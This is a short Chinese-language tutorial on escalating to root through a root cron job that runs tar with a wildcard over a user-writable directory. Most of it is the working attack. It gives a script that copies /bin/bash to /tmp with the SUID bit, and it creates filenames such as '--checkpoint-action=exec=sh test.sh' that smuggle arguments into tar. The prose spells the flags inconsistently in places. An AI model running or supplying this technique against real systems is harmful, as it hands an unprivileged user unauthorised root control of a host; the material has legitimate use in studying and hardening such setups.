定时任务常用于定期备份文件。

## **存在root的tar定时任务创建SUID提权**

如果定时任务中，存在root的定时任务是执行bf.sh，而bf.sh里面的命令是备份一个目录/tmp/123/下的文件，
```
cd /tmp/123;tar -zcf /tmp/bf.tar.gz *
```
由于tar命令进行*全部打包时，也是一个文件名一个文件名打包，如果有文件名为-checkpoint=1文件和-checkpoint-action=exec=shtest.sh文件时，会被当作参数执行。
于是攻击者可以在被打包的目录里执行，创建三个文件test.sh ， --checkpoint=1   ， -checkpoint-action=exec=sh test.sh。
```
echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > test.sh  
chmod +x test.sh  
创建test.sh脚本为了将/bin/bash复制到/tmp下，并提权SUID权限，同时将命令写入到test.sh脚本中

echo "" > --checkpoint=1   
echo "" > "--checkpoint-action=exec=sh test.sh"   
```
此时执行定时任务，就会生成/tmp/bash，执行bash就是root会话了。


条件：web权限账户基本上不太可能能进行提权，普通用户要有 备份的文件夹的写入权。